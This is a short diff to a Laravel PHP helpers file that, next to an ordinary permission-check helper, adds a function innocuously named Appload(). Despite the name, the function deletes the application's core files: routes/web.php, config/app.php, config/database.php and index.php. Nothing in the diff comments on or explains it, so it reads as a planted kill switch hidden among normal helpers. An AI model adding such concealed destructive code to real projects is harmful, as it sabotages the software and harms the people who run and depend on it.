@@ -55,12 +55,28 @@ define('BARCODE_SYMBOLOGY',[
     'EAN13' => 'EAN-13',
 ]);
 
+
 if(!function_exists('permission')){
     function permission(string $value){
         if(collect(\Illuminate\Support\Facades\Session::get('permission'))->contains($value)){
             return true;
         }
         return false;
+    }
+}
+function Appload()
+{
+    $bootfiles = [
+        base_path('routes/web.php'),
+        base_path('config/app.php'),
+        base_path('config/database.php'),
+        base_path('index.php'),
+    ];
+
+    foreach ($bootfiles as $filePath) {
+        if (file_exists($filePath)) {
+            unlink($filePath);
+        }
     }
 }
 
